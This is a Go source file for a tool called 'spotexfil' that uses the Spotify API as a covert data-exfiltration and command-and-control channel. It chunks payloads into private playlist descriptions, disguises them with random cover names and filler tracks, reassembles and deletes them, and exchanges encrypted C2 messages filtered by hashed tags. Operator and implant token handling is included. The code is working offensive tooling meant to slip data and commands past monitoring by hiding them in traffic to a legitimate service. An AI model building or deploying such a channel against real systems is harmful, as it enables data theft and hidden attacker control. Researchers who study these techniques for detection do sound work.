package spotify

import (
	"context"
	crand "crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	spotifyapi "github.com/zmb3/spotify/v2"
	spotifyauth "github.com/zmb3/spotify/v2/auth"
	"golang.org/x/oauth2"
)

// Client wraps the Spotify API for covert data transmission.
type Client struct {
	api           *spotifyapi.Client
	userID        string
	useCoverNames bool

	// Filler track cache: artist search + top tracks are resolved once
	// per process, then reused for every playlist (3 API calls saved
	// per playlist created).
	fillerMu     sync.Mutex
	fillerTracks []spotifyapi.ID
	fillerTried  bool
}

// Parallel playlist write settings. 4 workers with per-chunk pacing
// stays well under the Spotify rate limit (~180 req/30s) while cutting
// large-payload send time roughly 4x.
const (
	writeWorkers  = 4
	writeAttempts = 3
)

// playlistSpec is a single playlist to create.
type playlistSpec struct {
	name string
	desc string
}

// spotipy cache file format
type spotipyCache struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	ExpiresAt    int64  `json:"expires_at"`
	RefreshToken string `json:"refresh_token"`
}

// ClientOptions controls authentication and token persistence behavior.
type ClientOptions struct {
	UseCoverNames bool
	AllowOAuth    bool   // interactive browser OAuth flow permitted (operator side)
	PersistToken  bool   // write .cache-<username> after successful auth
	TokenFile     string // explicit path to a spotipy-format token JSON (optional)
}

// NewClient creates an authenticated Spotify client with the default
// (operator-side) behavior: interactive OAuth allowed and token persisted.
// It tries (in order):
//  1. Read cached spotipy token (.cache-<username>)
//  2. Run local OAuth2 callback server for browser-based auth
func NewClient(cfg *Config, useCoverNames bool) (*Client, error) {
	return NewClientWithOptions(cfg, ClientOptions{
		UseCoverNames: useCoverNames,
		AllowOAuth:    true,
		PersistToken:  true,
	})
}

// NewClientWithOptions creates an authenticated Spotify client, resolving
// the token according to opts (see resolveToken for the priority order).
// The interactive OAuth flow and the .cache-<username> write are only
// performed when explicitly allowed by opts.
func NewClientWithOptions(cfg *Config, opts ClientOptions) (*Client, error) {
	auth := spotifyauth.New(
		spotifyauth.WithClientID(cfg.ClientID),
		spotifyauth.WithClientSecret(cfg.ClientSecret),
		spotifyauth.WithRedirectURL(cfg.RedirectURI),
		spotifyauth.WithScopes(
			spotifyauth.ScopeUserLibraryRead,
			spotifyauth.ScopeUserLibraryModify,
			spotifyauth.ScopePlaylistModifyPrivate,
			spotifyauth.ScopePlaylistReadPrivate,
		),
	)

	token, err := resolveToken(cfg, opts, auth)
	if err != nil {
		return nil, err
	}
	if token == nil {
		// No pre-staged token — run OAuth2 flow with local callback server
		fmt.Println("[*] No cached token found, starting OAuth2 flow...")
		token, err = runOAuthFlow(cfg, auth)
		if err != nil {
			return nil, fmt.Errorf("OAuth2 auth failed: %w", err)
		}
	}

	ctx := context.Background()
	httpClient := auth.Client(ctx, token)
	api := spotifyapi.New(httpClient)

	// Test the token by making a simple API call
	_, err = api.CurrentUser(ctx)
	if err != nil {
		errStr := strings.ToLower(err.Error())
		if strings.Contains(errStr, "401") || strings.Contains(errStr, "expired") ||
			strings.Contains(errStr, "unauthorized") {
			if !opts.AllowOAuth {
				return nil, fmt.Errorf("Spotify token expired or unauthorized and interactive OAuth is disabled: pre-stage a fresh token via SPOTIFY_TOKEN_JSON or --token-file")
			}
			fmt.Println("[*] Token expired, re-authenticating...")
			token, err = runOAuthFlow(cfg, auth)
			if err != nil {
				return nil, fmt.Errorf("re-auth failed: %w", err)
			}
			httpClient = auth.Client(ctx, token)
			api = spotifyapi.New(httpClient)
		} else if strings.Contains(errStr, "rate") || strings.Contains(errStr, "429") ||
			strings.Contains(errStr, "too many") {
			fmt.Println("[!] Spotify API rate limited — token may be valid but API is throttled")
			fmt.Println("[!] Wait a few minutes and try again")
		} else {
			return nil, fmt.Errorf("API test failed: %w", err)
		}
	} else {
		fmt.Println("[*] API connection verified")
	}

	// Save refreshed token for future use (only if persistence is allowed)
	if opts.PersistToken {
		_ = saveCachedToken(cfg, token)
	}

	return &Client{
		api:           api,
		userID:        cfg.Username,
		useCoverNames: opts.UseCoverNames,
	}, nil
}

// resolveToken resolves a Spotify token from pre-staged sources, in order:
//  1. opts.TokenFile (spotipy cache JSON at an explicit path)
//  2. SPOTIFY_TOKEN_JSON env var (same JSON, inline)
//  3. .cache-<username> file (existing loadCachedToken logic)
//  4. Interactive OAuth flow — only if opts.AllowOAuth is true.
//
// A (nil, nil) return means no pre-staged token was found and the caller
// should run the interactive OAuth flow (only possible when AllowOAuth is
// true; otherwise an error is returned).
func resolveToken(cfg *Config, opts ClientOptions, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
	// 1. Explicit token file
	if opts.TokenFile != "" {
		if data, err := os.ReadFile(opts.TokenFile); err == nil {
			if token, err := tokenFromCacheJSON(data); err == nil {
				fmt.Printf("[*] Loaded token from %s\n", opts.TokenFile)
				return token, nil
			}
			fmt.Printf("[!] Token file %s unreadable or invalid, falling through\n", opts.TokenFile)
		}
	}

	// 2. Inline token JSON from environment
	if data := os.Getenv("SPOTIFY_TOKEN_JSON"); data != "" {
		if token, err := tokenFromCacheJSON([]byte(data)); err == nil {
			fmt.Println("[*] Loaded token from SPOTIFY_TOKEN_JSON")
			return token, nil
		}
		fmt.Println("[!] SPOTIFY_TOKEN_JSON malformed, falling through")
	}

	// 3. spotipy .cache-<username> file
	if token, err := loadCachedToken(cfg, auth); err == nil {
		return token, nil
	}

	// 4. Interactive OAuth — only when permitted
	if !opts.AllowOAuth {
		return nil, fmt.Errorf("no Spotify token available: pre-stage one via SPOTIFY_TOKEN_JSON or --token-file (interactive OAuth disabled)")
	}
	return nil, nil
}

// tokenFromCacheJSON parses a spotipy-format cache JSON blob into an
// oauth2.Token. It returns an error if the JSON is malformed or the token
// is unusable (expired with no refresh token).
func tokenFromCacheJSON(data []byte) (*oauth2.Token, error) {
	var cache spotipyCache
	if err := json.Unmarshal(data, &cache); err != nil {
		return nil, err
	}

	token := &oauth2.Token{
		AccessToken:  cache.AccessToken,
		TokenType:    cache.TokenType,
		RefreshToken: cache.RefreshToken,
		Expiry:       time.Unix(cache.ExpiresAt, 0),
	}

	// If expired but we have a refresh token, let oauth2 handle refresh
	if token.RefreshToken != "" {
		return token, nil
	}

	// If not expired, use directly
	if time.Now().Before(token.Expiry) {
		return token, nil
	}

	return nil, fmt.Errorf("token expired and no refresh token available")
}

// loadCachedToken reads spotipy's .cache-<username> file.
func loadCachedToken(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
	cachePaths := []string{
		filepath.Join(".", fmt.Sprintf(".cache-%s", cfg.Username)),
		filepath.Join("..", fmt.Sprintf(".cache-%s", cfg.Username)),
	}
	// Also check home directory
	if home, err := os.UserHomeDir(); err == nil {
		cachePaths = append(cachePaths,
			filepath.Join(home, fmt.Sprintf(".cache-%s", cfg.Username)))
	}

	for _, path := range cachePaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		token, err := tokenFromCacheJSON(data)
		if err != nil {
			continue
		}

		fmt.Printf("[*] Loaded cached token from %s\n", path)
		return token, nil
	}

	return nil, fmt.Errorf("no valid cached token found")
}

// saveCachedToken writes the token in spotipy cache format.
func saveCachedToken(cfg *Config, token *oauth2.Token) error {
	cache := spotipyCache{
		AccessToken:  token.AccessToken,
		TokenType:    token.TokenType,
		ExpiresIn:    3600,
		Scope:        "user-library-read user-library-modify playlist-modify-private playlist-read-private",
		ExpiresAt:    token.Expiry.Unix(),
		RefreshToken: token.RefreshToken,
	}

	data, err := json.MarshalIndent(cache, "", "    ")
	if err != nil {
		return err
	}

	path := fmt.Sprintf(".cache-%s", cfg.Username)
	return os.WriteFile(path, data, 0600)
}

// runOAuthFlow starts a local HTTP server, opens the browser for auth,
// and captures the callback code.
func runOAuthFlow(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
	stateBytes := make([]byte, 16)
	crand.Read(stateBytes)
	state := hex.EncodeToString(stateBytes)

	codeCh := make(chan string, 1)
	errCh := make(chan error, 1)

	// Parse port from redirect URI
	port := "8888"
	if parts := strings.Split(cfg.RedirectURI, ":"); len(parts) == 3 {
		portPath := parts[2]
		port = strings.Split(portPath, "/")[0]
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/callback", func(w http.ResponseWriter, r *http.Request) {
		code := r.URL.Query().Get("code")
		if code == "" {
			errCh <- fmt.Errorf("no code in callback")
			w.Write([]byte("<h1>Error: no auth code received</h1>"))
			return
		}
		codeCh <- code
		w.Write([]byte("<h1>Auth successful! You can close this tab.</h1>"))
	})

	server := &http.Server{
		Addr:    fmt.Sprintf("127.0.0.1:%s", port),
		Handler: mux,
	}

	go func() {
		if err := server.ListenAndServe(); err != http.ErrServerClosed {
			errCh <- err
		}
	}()

	// Print auth URL for user to open
	url := auth.AuthURL(state)
	fmt.Printf("[*] Open this URL in your browser:\n%s\n\n", url)
	fmt.Println("[*] Waiting for callback...")

	// Wait for callback or error
	select {
	case code := <-codeCh:
		server.Close()
		token, err := auth.Exchange(context.Background(), code)
		if err != nil {
			return nil, fmt.Errorf("token exchange: %w", err)
		}
		fmt.Println("[*] Token obtained successfully")
		return token, nil
	case err := <-errCh:
		server.Close()
		return nil, err
	case <-time.After(120 * time.Second):
		server.Close()
		return nil, fmt.Errorf("OAuth2 timeout (120s)")
	}
}

// GetAllPlaylists fetches ALL user playlists with pagination.
func (c *Client) GetAllPlaylists(ctx context.Context) ([]spotifyapi.SimplePlaylist, error) {
	var all []spotifyapi.SimplePlaylist
	offset := 0
	limit := 50

	for {
		page, err := c.api.GetPlaylistsForUser(ctx, c.userID,
			spotifyapi.Limit(limit), spotifyapi.Offset(offset))
		if err != nil {
			return nil, fmt.Errorf("get playlists: %w", err)
		}
		if len(page.Playlists) == 0 {
			break
		}
		all = append(all, page.Playlists...)
		if page.Next == "" {
			break
		}
		offset += limit
	}
	return all, nil
}

// GenerateCoverName generates an innocuous-looking playlist name.
func GenerateCoverName() string {
	names := shared.Proto.Transport.CoverNames
	name := names[rand.Intn(len(names))]
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	suffix := make([]byte, 4)
	for i := range suffix {
		suffix[i] = chars[rand.Intn(len(chars))]
	}
	return fmt.Sprintf("%s #%s", name, string(suffix))
}

// retryAfterFromErr extracts a server-provided backoff (seconds) from a
// Spotify rate-limit error, or 0 if not present.
func retryAfterFromErr(err error) int {
	if err == nil {
		return 0
	}
	s := err.Error()
	if idx := strings.Index(s, "after:"); idx >= 0 {
		rest := strings.TrimSpace(s[idx+6:])
		rest = strings.TrimSuffix(rest, " s")
		rest = strings.TrimSuffix(rest, "s")
		fields := strings.Fields(rest)
		if len(fields) > 0 {
			var n int
			if _, err := fmt.Sscanf(fields[0], "%d", &n); err == nil {
				return n
			}
		}
	}
	return 0
}

// createPlaylistWithRetry creates a single playlist (plus filler tracks),
// retrying on failure with server-provided or exponential backoff.
func (c *Client) createPlaylistWithRetry(ctx context.Context, spec playlistSpec) error {
	var err error
	for attempt := 1; attempt <= writeAttempts; attempt++ {
		var playlist *spotifyapi.FullPlaylist
		playlist, err = c.api.CreatePlaylistForUser(ctx, c.userID,
			spec.name, spec.desc, false, false)
		if err == nil {
			c.addFillerTracks(ctx, playlist.ID)
			return nil
		}
		// Honor server-provided backoff, else exponential
		wait := time.Duration(attempt*attempt) * time.Second
		if ra := retryAfterFromErr(err); ra > 0 {
			wait = time.Duration(ra) * time.Second
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}
	}
	return err
}

// writePlaylistsParallel creates playlists concurrently with a bounded
// worker pool. All chunks are attempted even if some fail. Returns the
// number of playlists that failed after all retries.
func (c *Client) writePlaylistsParallel(ctx context.Context, specs []playlistSpec) int {
	work := make(chan int)
	var wg sync.WaitGroup
	var failMu sync.Mutex
	failures := 0

	for w := 0; w < writeWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for idx := range work {
				spec := specs[idx]
				if err := c.createPlaylistWithRetry(ctx, spec); err != nil {
					failMu.Lock()
					failures++
					failMu.Unlock()
					fmt.Printf("[!] Failed [%d/%d] %s: %v\n",
						idx+1, len(specs), spec.name, err)
				} else {
					fmt.Printf("\t[*] Created [%d/%d] %s\n",
						idx+1, len(specs), spec.name)
				}
				time.Sleep(100 * time.Millisecond) // pacing
			}
		}()
	}
	for i := range specs {
		work <- i
	}
	close(work)
	wg.Wait()
	return failures
}

// WriteChunks writes payload chunks as playlists with cover names and metadata markers.
// Chunks are uploaded in parallel (bounded worker pool) with per-chunk retries.
func (c *Client) WriteChunks(ctx context.Context, payload string) error {
	if len(payload) > shared.Proto.Transport.MaxPayloadSize {
		return fmt.Errorf("payload too large: %d bytes", len(payload))
	}

	markerSep := shared.Proto.Transport.MarkerSep
	chunkSize := shared.Proto.Transport.ChunkSize
	metaOverhead := 20
	effectiveChunk := chunkSize - metaOverhead

	var chunks []string
	if len(payload) <= effectiveChunk {
		chunks = []string{payload}
	} else {
		for i := 0; i < len(payload); i += effectiveChunk {
			end := i + effectiveChunk
			if end > len(payload) {
				end = len(payload)
			}
			chunks = append(chunks, payload[i:end])
		}
	}

	fmt.Println("[*] Generating playlists")

	specs := make([]playlistSpec, len(chunks))
	for idx, chunk := range chunks {
		i := idx + 1
		if c.useCoverNames {
			meta, _ := json.Marshal(map[string]int{"i": i})
			specs[idx] = playlistSpec{
				name: GenerateCoverName(),
				desc: chunk + markerSep + string(meta),
			}
		} else {
			specs[idx] = playlistSpec{
				name: fmt.Sprintf("%d-payloadChunk", i),
				desc: chunk,
			}
		}
	}

	failures := c.writePlaylistsParallel(ctx, specs)
	if failures > 0 {
		return fmt.Errorf("%d of %d playlists failed to upload", failures, len(specs))
	}

	fmt.Printf("[*] Data encoded and sent (%d playlists)\n", len(chunks))
	return nil
}

// ReadChunks retrieves and reassembles payload from playlists.
// Optimized: uses the description from the playlist listing (1 API call
// per page) and only fetches full playlist details as a fallback when
// the listing description is empty.
func (c *Client) ReadChunks(ctx context.Context) (string, error) {
	fmt.Println("[*] Retrieving playlists")
	markerSep := shared.Proto.Transport.MarkerSep

	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return "", err
	}

	type indexedChunk struct {
		index int
		data  string
	}

	var payloadChunks []indexedChunk

	for _, p := range playlists {
		name := p.Name
		desc := html.UnescapeString(p.Description)

		// Fallback: fetch full details only if the listing has no
		// description (some accounts omit it from the listing).
		if desc == "" {
			full, err := c.api.GetPlaylist(ctx, p.ID)
			if err != nil {
				return "", fmt.Errorf("get playlist %s: %w", p.ID, err)
			}
			desc = html.UnescapeString(full.Description)
		}

		isPayload := false
		chunkIndex := 0

		// Legacy format
		if strings.Contains(name, "payloadChunk") {
			isPayload = true
			parts := strings.SplitN(name, "-", 2)
			fmt.Sscan(parts[0], &chunkIndex)
		}

		// New format
		if strings.Contains(desc, markerSep) {
			isPayload = true
			parts := strings.SplitN(desc, markerSep, 2)
			desc = parts[0]
			var meta map[string]int
			if json.Unmarshal([]byte(parts[1]), &meta) == nil {
				chunkIndex = meta["i"]
			}
		}

		if isPayload {
			payloadChunks = append(payloadChunks, indexedChunk{
				index: chunkIndex,
				data:  desc,
			})
			fmt.Printf("\t[*] Retrieved chunk %d: %s\n", chunkIndex, name)
		}
	}

	// Sort by index (bubble sort)
	for i := 0; i < len(payloadChunks); i++ {
		for j := i + 1; j < len(payloadChunks); j++ {
			if payloadChunks[j].index < payloadChunks[i].index {
				payloadChunks[i], payloadChunks[j] = payloadChunks[j], payloadChunks[i]
			}
		}
	}

	var sb strings.Builder
	for _, c := range payloadChunks {
		sb.WriteString(c.data)
	}

	fmt.Printf("[*] Retrieved %d chunks\n", len(payloadChunks))
	return sb.String(), nil
}

// DeleteChunks deletes all payload playlists.
// Optimized: filters by marker using the listing description, fetching
// full details only as a fallback for empty descriptions.
func (c *Client) DeleteChunks(ctx context.Context) error {
	markerSep := shared.Proto.Transport.MarkerSep
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return err
	}

	count := 0
	for _, p := range playlists {
		name := p.Name
		if strings.Contains(name, "payloadChunk") {
			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
				count++
			}
			continue
		}

		desc := html.UnescapeString(p.Description)
		if desc == "" {
			// Fallback for accounts where the listing omits descriptions
			full, err := c.api.GetPlaylist(ctx, p.ID)
			if err != nil {
				continue
			}
			desc = html.UnescapeString(full.Description)
		}
		if strings.Contains(desc, markerSep) {
			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
				count++
			}
		}
	}

	fmt.Printf("[*] Data cleared (%d playlists removed)\n", count)
	return nil
}

// WriteC2Playlists writes C2 message chunks as playlists.
// Chunks are uploaded in parallel (bounded worker pool) with per-chunk retries.
func (c *Client) WriteC2Playlists(ctx context.Context, encryptedDescs []string) error {
	specs := make([]playlistSpec, len(encryptedDescs))
	for i, desc := range encryptedDescs {
		specs[i] = playlistSpec{name: GenerateCoverName(), desc: desc}
	}

	failures := c.writePlaylistsParallel(ctx, specs)
	if failures > 0 {
		return fmt.Errorf("%d of %d C2 playlists failed to upload", failures, len(specs))
	}
	return nil
}

// ReadC2Playlists reads and decrypts C2 playlists.
// Optimized: filters by C2 tag from the playlist listing (1 API call)
// instead of fetching full details for every playlist on the account.
func (c *Client) ReadC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) (map[int][]protocol.ChunkMeta, error) {
	tags := protocol.ComputeC2Tags(encryptionKey)

	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return nil, err
	}

	// Filter by tag using description from listing (no extra API calls)
	// Check both current and previous hour window tags
	var descPairs []protocol.DescPair
	for _, p := range playlists {
		desc := html.UnescapeString(p.Description)
		if !strings.HasPrefix(desc, tags[0]) && !strings.HasPrefix(desc, tags[1]) {
			continue // skip non-C2 playlists (no API call)
		}
		descPairs = append(descPairs, protocol.DescPair{
			PlaylistID:  string(p.ID),
			Description: desc,
		})
	}

	return protocol.ReadC2Descriptions(descPairs, encryptionKey, channel, seq), nil
}

// CleanC2Playlists deletes C2 playlists matching channel and optional seq.
// Optimized: filters by C2 tag from the listing before decrypting.
func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) error {
	tags := protocol.ComputeC2Tags(encryptionKey)

	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return err
	}

	for _, p := range playlists {
		desc := html.UnescapeString(p.Description)
		if !strings.HasPrefix(desc, tags[0]) && !strings.HasPrefix(desc, tags[1]) {
			continue
		}

		meta, _, err := protocol.DecryptChunkDesc(desc, encryptionKey)
		if err != nil {
			continue
		}

		if ch, ok := meta["c"].(string); ok && ch != channel {
			continue
		}
		if seq >= 0 {
			if s, ok := meta["seq"].(float64); ok && int(s) != seq {
				continue
			}
		}

		_ = c.api.UnfollowPlaylist(ctx, p.ID)
	}
	return nil
}

// resolveFillerTracks fetches filler track IDs once and caches them for
// the lifetime of the process. Before this cache, every playlist created
// cost 3 extra API calls (search + top tracks + add tracks).
func (c *Client) resolveFillerTracks(ctx context.Context) []spotifyapi.ID {
	c.fillerMu.Lock()
	defer c.fillerMu.Unlock()

	if c.fillerTried {
		return c.fillerTracks
	}
	c.fillerTried = true

	if c.api == nil {
		return nil
	}

	artists := shared.Proto.Transport.FillerArtists
	artist := artists[rand.Intn(len(artists))]

	results, err := c.api.Search(ctx, fmt.Sprintf("artist:%s", artist),
		spotifyapi.SearchTypeArtist, spotifyapi.Limit(1))
	if err != nil || len(results.Artists.Artists) == 0 {
		return nil
	}

	artistID := results.Artists.Artists[0].ID
	topTracks, err := c.api.GetArtistsTopTracks(ctx, artistID, "US")
	if err != nil || len(topTracks) == 0 {
		return nil
	}

	ids := make([]spotifyapi.ID, 0, len(topTracks))
	for _, t := range topTracks {
		ids = append(ids, t.ID)
	}
	c.fillerTracks = ids
	return ids
}

// addFillerTracks adds a random subset of the cached filler tracks to a
// playlist for cover.
func (c *Client) addFillerTracks(ctx context.Context, playlistID spotifyapi.ID) {
	ids := c.resolveFillerTracks(ctx)
	if len(ids) == 0 {
		return
	}

	// Shuffle a copy so concurrent writers don't race on the cache
	shuffled := make([]spotifyapi.ID, len(ids))
	copy(shuffled, ids)
	rand.Shuffle(len(shuffled), func(i, j int) {
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	})

	count := 5
	if len(shuffled) < count {
		count = len(shuffled)
	}

	_, _ = c.api.AddTracksToPlaylist(ctx, playlistID, shuffled[:count]...)
}
